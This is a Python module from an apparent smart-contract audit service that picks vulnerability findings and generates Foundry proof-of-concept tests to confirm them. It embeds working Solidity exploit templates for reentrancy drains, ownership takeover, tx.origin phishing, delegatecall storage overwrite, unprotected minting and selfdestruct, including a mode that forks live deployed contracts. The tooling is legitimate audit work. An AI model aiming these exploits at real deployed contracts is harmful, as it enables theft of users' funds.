from __future__ import annotations

import asyncio
import re
import shutil
import tempfile
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

from wr3_api.core.config import get_settings
from wr3_api.domain.enums import Chain, Severity
from wr3_api.domain.schemas import AuditEvent, AuditRecord, EngineRunSummary, Finding
from wr3_api.services.artifacts import ArtifactEncryptionRequired, ArtifactVault
from wr3_api.services.sandbox import SandboxPolicy
from wr3_api.services.tool_paths import tool_subprocess_env


@dataclass(frozen=True)
class PocWorkerResult:
    status: str
    duration_ms: int
    candidate_count: int
    artifact_uri: str | None = None
    error: str | None = None
    attempts: int = 0
    confirmed_finding_ids: tuple[str, ...] = ()
    strategy: str | None = None
    fork_mode: bool = False


@dataclass(frozen=True)
class ForkContext:
    """Where to acquire a live deployed target instead of deploying from source."""

    rpc_url: str
    address: str
    block_number: int | None = None


class FoundryPocWorker:
    name = "foundry_poc"

    def __init__(self, sandbox_policy: SandboxPolicy | None = None) -> None:
        settings = get_settings()
        self._settings = settings
        self._sandbox_policy = sandbox_policy or SandboxPolicy(
            allowed_rpc_hosts=settings.sandbox_allowed_rpc_hosts,
            timeout_seconds=settings.sandbox_default_timeout_seconds,
        )
        self._max_attempts = settings.poc_max_attempts
        self._artifact_vault = ArtifactVault()

    def should_consider(self, record: AuditRecord) -> bool:
        return record.request.requested_depth in {"standard", "deep"}

    async def run(self, record: AuditRecord, candidates: list[Finding]) -> PocWorkerResult:
        started = time.perf_counter()
        if record.request.chain == Chain.SOLANA:
            return self._skipped(started, candidates, "solana_poc_uses_trident_not_foundry")
        if not candidates:
            return self._skipped(started, candidates, "poc_no_high_or_critical_candidates")
        decision = self._sandbox_policy.validate_argv(["forge", "test", "--json"])
        if not decision.allowed:
            return self._skipped(started, candidates, decision.reason)
        if shutil.which("forge") is None:
            return self._skipped(started, candidates, "foundry_binary_missing")
        return await self._run_retry_loop(record, candidates, started)

    def _resolve_fork(self, record: AuditRecord) -> ForkContext | None:
        """Enable fork mode only when an RPC is configured, the target has a real
        deployed address, and that RPC host is on the sandbox allowlist. This keeps
        fork exploits opt-in and egress-restricted (anvil/localhost by default)."""
        rpc = self._settings.poc_fork_rpc_url
        address = (record.request.address or "").strip()
        if not rpc or not address:
            return None
        if address.lower() in {"", "0x" + "0" * 40}:
            return None
        host = urllib.parse.urlparse(rpc).hostname
        if host not in self._sandbox_policy.allowed_rpc_hosts:
            return None
        return ForkContext(rpc_url=rpc, address=address, block_number=self._settings.poc_fork_block)

    def record_result(self, record: AuditRecord, result: PocWorkerResult, candidates: list[Finding]) -> None:
        if result.error:
            record.limitations.append(result.error)
        artifact_uri = result.artifact_uri or self._store_status_artifact(record, result, candidates)
        record.engine_runs.append(
            EngineRunSummary(
                audit_id=record.audit_id,
                engine=self.name,
                status=result.status,
                duration_ms=result.duration_ms,
                artifact_uri=artifact_uri,
                error=result.error,
            )
        )
        record.events.append(
            AuditEvent(
                audit_id=record.audit_id,
                event_type="poc_worker_result",
                payload={
                    "worker": self.name,
                    "status": result.status,
                    "candidate_count": result.candidate_count,
                    "candidate_ids": [finding.id for finding in candidates],
                    "attempts": result.attempts,
                    "confirmed_finding_ids": list(result.confirmed_finding_ids),
                    "strategy": result.strategy,
                    "fork_mode": result.fork_mode,
                    "artifact_private": artifact_uri is not None,
                    "artifact_uri": artifact_uri,
                    "error": result.error,
                },
            )
        )

    def _store_status_artifact(
        self,
        record: AuditRecord,
        result: PocWorkerResult,
        candidates: list[Finding],
    ) -> str | None:
        try:
            artifact = self._artifact_vault.store_json(
                audit_id=str(record.audit_id),
                kind="poc",
                payload={
                    "worker": self.name,
                    "status": result.status,
                    "reason": result.error,
                    "attempts": result.attempts,
                    "strategy": result.strategy,
                    "fork_mode": result.fork_mode,
                    "candidate_ids": [finding.id for finding in candidates],
                    "confirmed_finding_ids": list(result.confirmed_finding_ids),
                    "mode": "localhost_safe_status_artifact",
                },
                private=True,
            )
            return artifact.uri
        except ArtifactEncryptionRequired:
            record.limitations.append("poc_status_artifact_requires_encryption")
            return None

    def _skipped(
        self,
        started: float,
        candidates: list[Finding],
        reason: str,
    ) -> PocWorkerResult:
        return PocWorkerResult(
            status="skipped",
            duration_ms=int((time.perf_counter() - started) * 1000),
            candidate_count=len(candidates),
            error=reason,
        )

    async def _run_retry_loop(
        self,
        record: AuditRecord,
        candidates: list[Finding],
        started: float,
    ) -> PocWorkerResult:
        attempts: list[dict[str, object]] = []
        last_error: str | None = None
        confirmed: list[str] = []
        fork = self._resolve_fork(record)
        with tempfile.TemporaryDirectory(prefix="wr3-foundry-poc-") as temp_dir:
            root = Path(temp_dir)
            (root / "src").mkdir()
            (root / "test").mkdir()
            source_text = record.request.source or ""
            source_with_pragma = ensure_solidity_pragma(source_text)
            (root / "src" / "Target.sol").write_text(source_with_pragma, encoding="utf-8")
            (root / "foundry.toml").write_text("[profile.default]\nsrc='src'\ntest='test'\n", encoding="utf-8")

            target_name = extract_primary_contract(source_with_pragma)
            exploit = pick_exploit(candidates, source_with_pragma, target_name, fork)
            strategy_key = exploit.key if exploit else None

            for attempt in range(1, self._max_attempts + 1):
                test_source = build_foundry_test(
                    candidates,
                    attempt,
                    last_error,
                    source=source_with_pragma,
                    target_name=target_name,
                    exploit=exploit,
                    fork=fork,
                )
                (root / "test" / "Wr3PoC.t.sol").write_text(test_source, encoding="utf-8")
                proc = await asyncio.create_subprocess_exec(
                    "forge",
                    "test",
                    "--json",
                    cwd=root,
                    env=tool_subprocess_env(),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                try:
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(),
                        timeout=self._sandbox_policy.timeout_seconds,
                    )
                except TimeoutError:
                    proc.kill()
                    last_error = "forge_test_timeout"
                    attempts.append({"attempt": attempt, "status": "timeout"})
                    continue
                stdout_text = stdout.decode(errors="replace")
                stderr_text = stderr.decode(errors="replace")
                attempts.append(
                    {
                        "attempt": attempt,
                        "returncode": proc.returncode,
                        "stdout": stdout_text[-4000:],
                        "stderr": stderr_text[-4000:],
                    }
                )
                if proc.returncode == 0 and is_generated_poc_meaningful(candidates, test_source):
                    target_finding = exploit.finding if exploit else candidates[0]
                    confirmed = [target_finding.id]
                    break
                last_error = stderr_text or stdout_text or f"forge_returncode_{proc.returncode}"

        artifact_uri = None
        artifact_error = None
        try:
            artifact = self._artifact_vault.store_json(
                audit_id=str(record.audit_id),
                kind="poc",
                payload={
                    "worker": self.name,
                    "attempts": attempts,
                    "strategy": strategy_key,
                    "fork_mode": fork is not None,
                    "candidate_ids": [finding.id for finding in candidates],
                    "confirmed_finding_ids": confirmed,
                },
                private=True,
            )
            artifact_uri = artifact.uri
        except ArtifactEncryptionRequired:
            artifact_error = "poc_artifact_requires_encryption"

        status = "confirmed" if confirmed else "attempted"
        return PocWorkerResult(
            status=status,
            duration_ms=int((time.perf_counter() - started) * 1000),
            candidate_count=len(candidates),
            artifact_uri=artifact_uri,
            error=artifact_error or (None if confirmed else "poc_not_confirmed_after_retry_loop"),
            attempts=len(attempts),
            confirmed_finding_ids=tuple(confirmed),
            strategy=strategy_key,
            fork_mode=fork is not None,
        )


def high_risk_poc_candidates(findings: list[Finding]) -> list[Finding]:
    return [
        finding
        for finding in findings
        if finding.severity in {Severity.CRITICAL, Severity.HIGH}
        and finding.exploitability != "dismissed"
    ]


def ensure_solidity_pragma(source: str) -> str:
    if "pragma solidity" in source:
        return source
    return "pragma solidity ^0.8.20;\n" + source


def extract_primary_contract(source: str) -> str | None:
    """Name the contract the PoC should instantiate.

    Prefer the contract whose body holds a vulnerable sink (withdraw / owner
    assignment / selfdestruct) over any interface or library declared earlier in
    the file. Returns None when nothing parseable is present.
    """
    names = re.findall(r"\bcontract\s+([A-Za-z_]\w*)", source)
    if not names:
        return None
    for name in names:
        start = source.find(f"contract {name}")
        if start == -1:
            continue
        body = source[start : start + 8000]
        if any(sink in body for sink in ("withdraw", "selfdestruct", "owner", "delegatecall")):
            return name
    return names[-1]


# --------------------------------------------------------------------------- #
# Lightweight Solidity inspection (regex + brace matching, good enough to gate
# which exploit template to *attempt*; forge execution is what actually confirms).
# --------------------------------------------------------------------------- #


def _balanced_body(source: str, open_idx: int) -> str:
    depth = 0
    for i in range(open_idx, len(source)):
        char = source[i]
        if char == "{":
            depth += 1
        elif char == "}":
            depth -= 1
            if depth == 0:
                return source[open_idx : i + 1]
    return source[open_idx:]


def _iter_functions(source: str):
    for match in re.finditer(r"\bfunction\s+([A-Za-z_]\w*)\s*\(([^)]*)\)", source):
        name, params = match.group(1), match.group(2).strip()
        brace = source.find("{", match.end())
        semi = source.find(";", match.end())
        if brace == -1 or (semi != -1 and semi < brace):
            continue  # interface / abstract declaration, no body
        between = source[match.end() : brace]
        if "function" in between:
            continue
        yield name, params, _balanced_body(source, brace), between


def _first_param_type(params: str) -> str | None:
    params = params.strip()
    if not params:
        return None
    first = params.split(",")[0].strip()
    return first.split()[0] if first else None


def _has_owner_getter(source: str) -> bool:
    if re.search(r"\baddress\s+public\s+(?:constant\s+|immutable\s+)?owner\b", source):
        return True
    return bool(re.search(r"function\s+owner\s*\(\s*\)\s*[^{;]*\breturns\s*\(\s*address", source))


def _find_owner_setter(source: str) -> tuple[str, bool] | None:
    """Return (function_name, takes_address_arg) for a function that assigns the
    owner state variable, preferring one that takes an address argument."""
    fallback: tuple[str, bool] | None = None
    for name, params, body, _between in _iter_functions(source):
        if not re.search(r"\b_?owner\s*=", body):
            continue
        ptype = _first_param_type(params)
        if ptype and ptype.startswith("address") and "," not in params:
            return name, True
        if params == "" and fallback is None:
            fallback = (name, False)
    return fallback


def _find_selfdestruct_fn(source: str) -> tuple[str, str] | None:
    """Return (function_name, arg_kind) where arg_kind is 'none' or 'address'."""
    for name, params, body, _between in _iter_functions(source):
        if "selfdestruct" not in body and "suicide" not in body:
            continue
        ptype = _first_param_type(params)
        if params == "":
            return name, "none"
        if ptype and ptype.startswith("address") and "," not in params:
            return name, "address"
    return None


def _balance_accessor(source: str) -> str | None:
    for name in ("balanceOf", "balances"):
        if re.search(r"mapping\s*\(\s*address\s*=>\s*uint(?:256)?\s*\)\s*public\s+" + name + r"\b", source):
            return name
    return None


def _find_tx_origin_owner_setter(source: str) -> tuple[str, bool] | None:
    """A function guarded by tx.origin that reassigns owner — the classic phishing
    sink. Returns (function_name, takes_address_arg)."""
    for name, params, body, _between in _iter_functions(source):
        if "tx.origin" not in body or not re.search(r"\b_?owner\s*=", body):
            continue
        ptype = _first_param_type(params)
        if ptype and ptype.startswith("address") and "," not in params:
            return name, True
        if params == "":
            return name, False
    return None


def _find_delegatecall_fn(source: str) -> str | None:
    """A function that delegatecalls into an attacker-supplied (address, bytes)."""
    for name, params, body, _between in _iter_functions(source):
        if "delegatecall" not in body:
            continue
        types = [piece.strip().split()[0] for piece in params.split(",") if piece.strip()]
        if len(types) >= 2 and types[0].startswith("address") and types[1].startswith("bytes"):
            return name
    return None


_MINT_ARG_VALUES = {"address": "attacker", "uint": "1000 ether", "bool": "true"}


def _find_unprotected_mint(source: str) -> tuple[str, list[str], str] | None:
    """A mint-like function that credits a public balance mapping. Returns
    (function_name, concrete_call_args, balance_accessor)."""
    accessor = _balance_accessor(source)
    if accessor is None:
        return None
    for name, params, body, _between in _iter_functions(source):
        if "mint" not in name.lower() or accessor not in body:
            continue
        types = [piece.strip().split()[0] for piece in params.split(",") if piece.strip()]
        args: list[str] = []
        ok = True
        for type_name in types:
            if type_name.startswith("address"):
                args.append(_MINT_ARG_VALUES["address"])
            elif type_name.startswith("uint"):
                args.append(_MINT_ARG_VALUES["uint"])
            elif type_name.startswith("bool"):
                args.append(_MINT_ARG_VALUES["bool"])
            else:
                ok = False
                break
        if ok:
            return name, args, accessor
    return None


# --------------------------------------------------------------------------- #
# Exploit strategy selection
# --------------------------------------------------------------------------- #

_REENTRANCY_HINTS = ("reentr", "reentrancy")
_OWNERSHIP_HINTS = ("access", "ownership", "unprotected", "authoriz", "privileg", "takeover")
_SELFDESTRUCT_HINTS = ("selfdestruct", "suicidal", "self-destruct", "self destruct")
_TX_ORIGIN_HINTS = ("tx.origin", "tx origin", "txorigin", "phish")
_DELEGATECALL_HINTS = ("delegatecall", "delegate call", "delegate-call")
_MINT_HINTS = ("mint", "inflation", "infinite supply", "unlimited supply", "token supply")


@dataclass(frozen=True)
class PickedExploit:
    key: str
    finding: Finding
    detail: object | None = None


def pick_exploit(
    candidates: list[Finding],
    source: str,
    target_name: str | None,
    fork: ForkContext | None = None,
) -> PickedExploit | None:
    """Choose a finding + exploit strategy we can build a *real*, self-checking
    test for. Returns None when nothing matches — the worker then emits the inert
    compile-only harness and the finding stays unconfirmed. A "confirmed" result
    is always sound because forge actually executes the exploit: if the contract
    is not in fact vulnerable, the assertions revert and nothing is confirmed."""
    if not target_name:
        return None
    nospace = source.lower().replace(" ", "")
    has_dw = "functiondeposit" in nospace and "functionwithdraw" in nospace and "call{value" in nospace
    has_owner = _has_owner_getter(source)
    owner_setter = _find_owner_setter(source) if has_owner else None
    tx_origin_setter = _find_tx_origin_owner_setter(source) if has_owner else None
    delegatecall_fn = _find_delegatecall_fn(source) if has_owner else None
    mint_fn = _find_unprotected_mint(source)
    selfdestruct_fn = _find_selfdestruct_fn(source)

    for finding in candidates:
        hay = f"{finding.summary} {finding.taxonomy.wr3_category} {finding.description}".lower()
        if has_dw and any(hint in hay for hint in _REENTRANCY_HINTS):
            return PickedExploit("reentrancy", finding)
        # tx.origin phishing is more specific than generic access-control; check first.
        if tx_origin_setter and any(hint in hay for hint in _TX_ORIGIN_HINTS):
            return PickedExploit("tx_origin", finding, tx_origin_setter)
        if delegatecall_fn and any(hint in hay for hint in _DELEGATECALL_HINTS):
            return PickedExploit("delegatecall", finding, delegatecall_fn)
        if mint_fn and any(hint in hay for hint in _MINT_HINTS):
            return PickedExploit("erc20_mint", finding, mint_fn)
        if owner_setter and any(hint in hay for hint in _OWNERSHIP_HINTS):
            return PickedExploit("ownership_takeover", finding, owner_setter)
        # selfdestruct relies on same-tx code deletion (EIP-6780): source mode only.
        if fork is None and selfdestruct_fn and any(hint in hay for hint in _SELFDESTRUCT_HINTS):
            return PickedExploit("selfdestruct", finding, selfdestruct_fn)
    return None


def pick_exploit_candidate(
    candidates: list[Finding],
    source: str,
    target_name: str | None,
) -> Finding | None:
    """Back-compat shim: return only the chosen finding (source mode)."""
    picked = pick_exploit(candidates, source, target_name, None)
    return picked.finding if picked else None


# --------------------------------------------------------------------------- #
# Foundry test generation
# --------------------------------------------------------------------------- #

_VM_INTERFACE = """interface IWr3Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address sender) external;
    function prank(address sender, address origin) external;
    function createSelectFork(string calldata urlOrAlias) external returns (uint256);
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
}"""
_VM_DECL = "IWr3Vm private constant vm = IWr3Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);"


def _acquire_target(target_name: str, fork: ForkContext | None) -> str:
    if fork is None:
        return f"{target_name} target = new {target_name}();"
    addr_hex = fork.address.lower().removeprefix("0x")
    if fork.block_number:
        fork_line = f'vm.createSelectFork("{fork.rpc_url}", {fork.block_number});'
    else:
        fork_line = f'vm.createSelectFork("{fork.rpc_url}");'
    cast = f'{target_name} target = {target_name}(payable(address(bytes20(hex"{addr_hex}"))));'
    return f"{fork_line}\n        {cast}"


def build_foundry_test(
    candidates: list[Finding],
    attempt: int,
    last_error: str | None,
    *,
    source: str = "",
    target_name: str | None = None,
    exploit: PickedExploit | None = None,
    fork: ForkContext | None = None,
) -> str:
    if exploit is not None and target_name:
        if exploit.key == "reentrancy":
            return build_reentrancy_exploit(target_name, exploit.finding, fork)
        if exploit.key == "ownership_takeover":
            return build_ownership_takeover_exploit(target_name, exploit.finding, exploit.detail, fork)
        if exploit.key == "tx_origin":
            return build_tx_origin_exploit(target_name, exploit.finding, exploit.detail, fork)
        if exploit.key == "delegatecall":
            return build_delegatecall_exploit(target_name, exploit.finding, exploit.detail, fork)
        if exploit.key == "erc20_mint":
            return build_unprotected_mint_exploit(target_name, exploit.finding, exploit.detail, fork)
        if exploit.key == "selfdestruct":
            return build_selfdestruct_exploit(target_name, exploit.finding, exploit.detail)
    finding = candidates[0] if candidates else None
    summary = (finding.summary if finding else "No candidate").replace("*/", "* /")
    category = finding.taxonomy.wr3_category if finding else "none"
    safe_last_error = (last_error or "none").replace("*/", "* /")[-600:]
    return f"""// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
wr3 generated PoC harness attempt {attempt}
candidate: {summary}
category: {category}
previous_error: {safe_last_error}
This harness is executed only in an isolated Foundry temp directory.
*/
import "../src/Target.sol";

contract Wr3PoCTest {{
    function testWr3HarnessCompiles() public pure {{
        require(bytes("{category}").length > 0, "wr3-empty-category");
    }}
}}
"""


_REENTRANCY_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 reentrancy PoC (__MODE__ mode)
// finding: __SUMMARY__
import "../src/Target.sol";

__VM_INTERFACE__

contract Wr3ReentrancyAttacker {
    __TARGET__ private target;
    uint256 private stake;

    constructor(__TARGET__ _target) {
        target = _target;
    }

    function attack() external payable {
        stake = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= stake && stake > 0) {
            target.withdraw();
        }
    }
}

contract Wr3PoCTest {
    __VM_DECL__

    function testWr3ReentrancyDrain() public {
        __ACQUIRE__
        vm.deal(address(this), 100 ether);
__SEED__        Wr3ReentrancyAttacker attacker = new Wr3ReentrancyAttacker(target);
        uint256 stake = 1 ether;
        attacker.attack{value: stake}();

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: attacker withdrew strictly more than it
        // staked, i.e. it stole other depositors' funds via reentrancy.
        require(address(attacker).balance > stake, "wr3: reentrancy did not profit");
__POOL_ASSERT__    }
}
"""


def build_reentrancy_exploit(target_name: str, finding: Finding, fork: ForkContext | None = None) -> str:
    seed = "" if fork else "        uint256 pool = 5 ether;\n        target.deposit{value: pool}();\n"
    pool_assert = (
        "" if fork else '        require(address(target).balance < pool, "wr3: victim pool not drained");\n'
    )
    return (
        _REENTRANCY_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
        .replace("__VM_DECL__", _VM_DECL)
        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
        .replace("__SEED__", seed)
        .replace("__POOL_ASSERT__", pool_assert)
        .replace("__MODE__", "fork" if fork else "source")
        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
        .replace("__TARGET__", target_name)
    )


_OWNERSHIP_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 unprotected-ownership PoC (__MODE__ mode)
// finding: __SUMMARY__
import "../src/Target.sol";

__VM_INTERFACE__

contract Wr3PoCTest {
    __VM_DECL__

    function testWr3OwnershipTakeover() public {
        __ACQUIRE__
        address attacker = address(uint160(0xA11CE));
        vm.prank(attacker);
        target.__SETTER__(__SETTER_ARG__);

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: an arbitrary attacker became owner,
        // proving the privileged setter has no effective access control.
        require(target.owner() == attacker, "wr3: ownership not taken over");
    }
}
"""


def build_ownership_takeover_exploit(
    target_name: str,
    finding: Finding,
    detail: object | None,
    fork: ForkContext | None = None,
) -> str:
    name, takes_addr = detail if isinstance(detail, tuple) else ("setOwner", True)
    return (
        _OWNERSHIP_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
        .replace("__VM_DECL__", _VM_DECL)
        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
        .replace("__SETTER_ARG__", "attacker" if takes_addr else "")
        .replace("__SETTER__", name)
        .replace("__MODE__", "fork" if fork else "source")
        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
        .replace("__TARGET__", target_name)
    )


_TX_ORIGIN_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 tx.origin-phishing PoC (__MODE__ mode)
// finding: __SUMMARY__
import "../src/Target.sol";

__VM_INTERFACE__

contract Wr3Phisher {
    __TARGET__ private target;

    constructor(__TARGET__ _target) {
        target = _target;
    }

    function pwn(address newOwner) external {
        target.__SETTER__(__SETTER_ARG__);
    }
}

contract Wr3PoCTest {
    __VM_DECL__

    function testWr3TxOriginPhish() public {
        __ACQUIRE__
        address ownerEoa = target.owner();
        address attacker = address(uint160(0xA11CE));
        Wr3Phisher phisher = new Wr3Phisher(target);

        // The owner is socially engineered into calling the attacker's contract.
        // msg.sender to the victim is the phisher, but tx.origin stays the owner.
        vm.prank(ownerEoa, ownerEoa);
        phisher.pwn(attacker);

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: ownership changed via a contract call
        // that only passed because the victim authorises by tx.origin.
        require(target.owner() == __NEW_OWNER__ && target.owner() != ownerEoa, "wr3: tx.origin phishing failed");
    }
}
"""


def build_tx_origin_exploit(
    target_name: str,
    finding: Finding,
    detail: object | None,
    fork: ForkContext | None = None,
) -> str:
    name, takes_addr = detail if isinstance(detail, tuple) else ("setOwner", True)
    return (
        _TX_ORIGIN_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
        .replace("__VM_DECL__", _VM_DECL)
        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
        .replace("__SETTER_ARG__", "newOwner" if takes_addr else "")
        .replace("__SETTER__", name)
        .replace("__NEW_OWNER__", "attacker" if takes_addr else "address(phisher)")
        .replace("__MODE__", "fork" if fork else "source")
        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
        .replace("__TARGET__", target_name)
    )


_DELEGATECALL_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 unprotected-delegatecall PoC (__MODE__ mode)
// finding: __SUMMARY__
import "../src/Target.sol";

__VM_INTERFACE__

contract Wr3Implant {
    // When delegatecalled, overwrites storage slot 0 of the caller (the victim).
    function pwn(address newOwner) external {
        assembly {
            sstore(0, newOwner)
        }
    }
}

contract Wr3PoCTest {
    __VM_DECL__

    function testWr3DelegatecallTakeover() public {
        __ACQUIRE__
        address attacker = address(uint160(0xA11CE));
        Wr3Implant implant = new Wr3Implant();

        vm.prank(attacker);
        target.__DCALL__(address(implant), abi.encodeWithSignature("pwn(address)", attacker));

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: the unprotected delegatecall let an
        // attacker overwrite owner (storage slot 0) and seize the contract.
        require(target.owner() == attacker, "wr3: delegatecall takeover failed");
    }
}
"""


def build_delegatecall_exploit(
    target_name: str,
    finding: Finding,
    detail: object | None,
    fork: ForkContext | None = None,
) -> str:
    dcall = detail if isinstance(detail, str) else "execute"
    return (
        _DELEGATECALL_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
        .replace("__VM_DECL__", _VM_DECL)
        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
        .replace("__DCALL__", dcall)
        .replace("__MODE__", "fork" if fork else "source")
        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
        .replace("__TARGET__", target_name)
    )


_MINT_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 unprotected-mint PoC (__MODE__ mode)
// finding: __SUMMARY__
import "../src/Target.sol";

__VM_INTERFACE__

contract Wr3PoCTest {
    __VM_DECL__

    function testWr3UnprotectedMint() public {
        __ACQUIRE__
        address attacker = address(uint160(0xA11CE));
        uint256 beforeBal = target.__ACCESSOR__(attacker);

        vm.prank(attacker);
        target.__MINT_ARGS_CALL__;

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: an arbitrary attacker minted tokens to
        // itself with no authorization.
        require(target.__ACCESSOR__(attacker) > beforeBal, "wr3: unprotected mint failed");
    }
}
"""


def build_unprotected_mint_exploit(
    target_name: str,
    finding: Finding,
    detail: object | None,
    fork: ForkContext | None = None,
) -> str:
    if isinstance(detail, tuple):
        name, args, accessor = detail
    else:
        name, args, accessor = "mint", ["attacker", "1000 ether"], "balanceOf"
    call = f"{name}({', '.join(args)})"
    return (
        _MINT_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
        .replace("__VM_DECL__", _VM_DECL)
        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
        .replace("__MINT_ARGS_CALL__", call)
        .replace("__ACCESSOR__", accessor)
        .replace("__MODE__", "fork" if fork else "source")
        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
        .replace("__TARGET__", target_name)
    )


_SELFDESTRUCT_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 unprotected-selfdestruct PoC (source mode)
// finding: __SUMMARY__
import "../src/Target.sol";

__VM_INTERFACE__

contract Wr3PoCTest {
    __VM_DECL__

    function testWr3UnprotectedSelfdestruct() public {
        __ACQUIRE__
        vm.deal(address(target), 5 ether);
        uint256 balBefore = address(target).balance;
        address attacker = address(uint160(0xA11CE));
        vm.prank(attacker);
        target.__KILLFN__(__KILL_ARG__);

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: an arbitrary attacker forced the
        // contract to selfdestruct and disgorge all of its ETH. (Code deletion is
        // deferred to end-of-tx under EIP-6780, so we assert on the balance drain,
        // which is the immediate, observable impact.)
        require(balBefore > 0 && address(target).balance == 0, "wr3: selfdestruct did not drain contract");
    }
}
"""


def build_selfdestruct_exploit(target_name: str, finding: Finding, detail: object | None) -> str:
    name, arg_kind = detail if isinstance(detail, tuple) else ("kill", "none")
    kill_arg = "payable(attacker)" if arg_kind == "address" else ""
    return (
        _SELFDESTRUCT_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
        .replace("__VM_DECL__", _VM_DECL)
        .replace("__ACQUIRE__", _acquire_target(target_name, None))
        .replace("__KILL_ARG__", kill_arg)
        .replace("__KILLFN__", name)
        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
        .replace("__TARGET__", target_name)
    )


def is_generated_poc_meaningful(candidates: list[Finding], test_source: str) -> bool:
    if not candidates:
        return False
    return "WR3_CONFIRMED_EXPLOIT_ASSERTION" in test_source
